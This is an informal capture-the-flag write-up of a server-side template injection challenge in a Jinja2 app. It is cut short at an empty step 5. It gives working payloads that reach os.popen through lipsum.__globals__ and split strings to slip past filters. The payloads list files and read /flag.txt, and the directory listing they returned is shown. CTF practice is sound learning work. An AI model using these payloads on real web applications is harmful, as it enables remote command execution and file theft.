1. `{{7 * 7}}`
2. SSTI works so we just proceed to ls by
* **`ls -a`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -a').read() }}
    ```
3. found `flag.txt` so we just did
* **`cat`:**
    ```jinja2
    {{lipsum.__globals__['o'+'s'].popen('ca'+'t /fl'+'ag.txt').read()}}
    ```
4. its empty tho. we look for other files by doing:
* **`ls -R`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -R').read() }}
    ```
* and found these:
*
    ```
    > .: Dockerfile app.py docker-compose.yml flag.txt requirements.txt static templates ./static: script.js style.css ./templates: echo.html index.html
    ```
5. 